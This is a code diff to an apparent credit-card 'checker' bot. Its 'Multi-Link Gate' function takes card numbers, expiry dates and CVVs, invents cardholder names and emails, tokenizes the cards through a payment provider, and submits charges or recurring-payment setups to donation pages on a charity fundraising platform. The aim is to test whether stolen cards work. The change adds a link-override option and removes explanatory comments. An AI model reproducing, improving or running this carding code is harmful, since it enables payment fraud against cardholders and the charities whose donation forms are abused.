@@ -78,14 +78,17 @@ def get_random_link():
     return random.choice(links)
 
 # --- CORE CHECKER FUNCTION ---
-def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, _get_charge_value, custom_charge_amount=None):
+def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, _get_charge_value, custom_charge_amount=None, link_data_override=None):
     """
     Logic for the special Multi-Link Gate.
-    It randomly picks a saved link and its parameters to perform a check.
-    The logic is based on Gate 1's charge/live functionality.
+    It can accept link_data_override for validation, or get a random link for normal checking.
     """
     multi_link_mode = get_mode_func()
-    link_data = get_random_link()
+    
+    if link_data_override:
+        link_data = link_data_override
+    else:
+        link_data = get_random_link()
 
     if not link_data:
         return 'error', line, "MULTI_LINK_ERROR: No valid links available. Please use /addlink to add some.", bin_info
@@ -105,7 +108,7 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
         cardholder = f"{first_name} {last_name}"
         email = random_email()
 
-        # Step 1: Tokenize card (using a dynamic formId to be safer)
+        # Step 1: Tokenize card
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
         random_form_part = ''.join(random.choices(string.digits, k=18))
         form_id = f"250{random_form_part}"
@@ -123,7 +126,7 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
             "cardNumber": cc,
             "cvv": cvv,
             "paymentMethod": "ECA",
-            "merchantId": "3000022877", # This seems to be constant for RaiseNow
+            "merchantId": "3000022877",
             "browserUserAgent": user_agent,
             "browserJavaEnabled": "false",
             "browserLanguage": "en-US",
@@ -159,7 +162,6 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
             "User-Agent": user_agent
         }
 
-        # This payload is based on the user's provided structure
         base_payload = {
             "account_uuid": account_uuid,
             "test_mode": False,
@@ -181,7 +183,7 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
                 },
                 "solution": {
                     "uuid": solution_uuid,
-                    "name": "Berlin Marathon - Runner", # Example name, can't be fetched easily
+                    "name": "Donation",
                     "type": "donate"
                 },
                 "product": {
@@ -205,8 +207,8 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
 
         # --- CHARGE MODE ---
         if multi_link_mode == 'charge':
-            charge_value = _get_charge_value('special', custom_charge_amount) # Use 'special' as gate_id for charge range
-            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
+            charge_value = _get_charge_value('special', custom_charge_amount)
+            payment_url = "https://api.raisenow.io/payments"
             payment_payload = base_payload.copy()
             payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
 
@@ -225,9 +227,9 @@ def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellati
 
         # --- LIVE CHECK MODE ---
         else: # 'live'
-            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
+            payment_url = "https://api.raisenow.io/payment-sources"
             payment_payload = base_payload.copy()
-            payment_payload["amount"] = {"currency": "EUR", "value": 50} # Default value for live check
+            payment_payload["amount"] = {"currency": "EUR", "value": 50}
             payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }
 
             payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
